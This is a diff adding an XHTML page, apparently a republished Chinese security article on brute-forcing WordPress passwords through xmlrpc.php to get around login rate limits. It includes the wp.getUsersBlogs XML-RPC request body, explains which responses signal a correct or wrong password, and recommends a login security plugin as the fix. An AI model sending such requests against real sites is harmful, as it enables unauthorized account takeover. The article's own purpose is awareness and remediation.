@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>利用xmlrpc.php对WordPress进行暴力破解攻击</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>利用xmlrpc.php对WordPress进行暴力破解攻击</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200346365&amp;idx=4&amp;sn=503b8943498eef19fb83b51f135aadb2&amp;chksm=28ea98761f9d1160ed1e762a715ef62279d55737eafa69d3c909a4021416833b464a9c5addd1&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=200346365&amp;idx=4&amp;sn=503b8943498eef19fb83b51f135aadb2&amp;chksm=28ea98761f9d1160ed1e762a715ef62279d55737eafa69d3c909a4021416833b464a9c5addd1&amp;scene=27#wechat_redirect</a></blockquote><p style="">近几天wordpress社区的小伙伴们反映遭到了利用xmlrpc.php进行暴力破解的攻击。利用xmlrpc.php提供的接口尝试猜解用户的密码，可以绕过wordpress对暴力破解的限制。已经发现了大规模的利用，启用了xmlrpc的同学需要尽快修复。<strong style="margin: 0px; padding: 0px;">安装或者升级Login Security Solutin插件</strong></p><p style="">通常wordpress登录接口都是做了防暴力破解防护的，比如freebuf的登录只能有尝试5次。</p><p><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynrMh1GluOaB3fiawqElWrGXQKE8H3dHouC8z3gb8icGd90NZELes0LTTQ/0" style="float:none;" src="../Images/df328df381e05b61da42709e29f1cd3f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynrMh1GluOaB3fiawqElWrGXQKE8H3dHouC8z3gb8icGd90NZELes0LTTQ/0"/></p><p><br/></p><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); border: 0px; line-height: 19.9999942779541px; font-family: Monaco, Courier, monospace; font-size: 14px; background-color: rgb(255, 255, 255);"><span style="margin: 0px; padding: 0px; font-family: sans-serif; font-size: 16px;">这种利用xmlrpc.php的攻击可以绕过这些限制。攻击的方式直接POST以下数据到xmlrpc.php.<br/><br/></span><br style="margin: 0px; padding: 0px;"/></pre><pre class="prettyprint lang-bash prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px; background-color: rgb(247, 247, 249);">&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+  &lt;params&gt;
+    &lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;
+    &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;</pre><p style=""><br/></p><p style="">其中username字段是预先收集的用户名。password是尝试的密码。关于getUsersBlogs接口的更多信息可以参考官方的指南。如果密码正确，返回为：</p><p style=""><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynU9LIzzVJKPxNv8UXsbiabicaCWFXRK943dmoWwuPZCKfgUEH6iaaUxZxw/0" style="float:none;" src="../Images/37b24f487aef902632238abe373aa0eb.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynU9LIzzVJKPxNv8UXsbiabicaCWFXRK943dmoWwuPZCKfgUEH6iaaUxZxw/0"/></p><p><br/></p><p><span style="">密码错误返回为403：</span></p><p><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryyn5pdZ0mPTyibqZRnD571UKy2paRsUQ0ouHJSz9Bic8e3JQOHR8cGZThbg/0" style="float:none;" src="../Images/b5fa3c0d8632a4f13500c98cac82e7e9.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryyn5pdZ0mPTyibqZRnD571UKy2paRsUQ0ouHJSz9Bic8e3JQOHR8cGZThbg/0"/></p><p><br/></p><p><span style="">使用intruder进行测试，发现服务端没有进行限制。</span></p><p><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynpLD5osa4bxX1ScCyNFaJrGbVJTOb0OK1s1uxJlWgrHrPUo8U4gLOIA/0" style="float:none;" src="../Images/1bba1685fc946b721c744262695fea0f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynpLD5osa4bxX1ScCyNFaJrGbVJTOb0OK1s1uxJlWgrHrPUo8U4gLOIA/0"/></p><p><br/></p><p><strong style="">[Freebuf：感谢子夏，freebuf已第一时间修复该问题]</strong></p><p><br/></p><p><img data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynx6M0Sl2v2LwHLSNbywpWUa4kicU5p1KOiaIvicyHBOn6YDC42loCmuUWg/0" style="float:none;" src="../Images/fdbabd697ffa063fd2c18cf5b015b5b9.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR38gnffNxtYSnfhQtesoryynx6M0Sl2v2LwHLSNbywpWUa4kicU5p1KOiaIvicyHBOn6YDC42loCmuUWg/0"/></p><p><br/></p>
+        
+</body>
+</html>
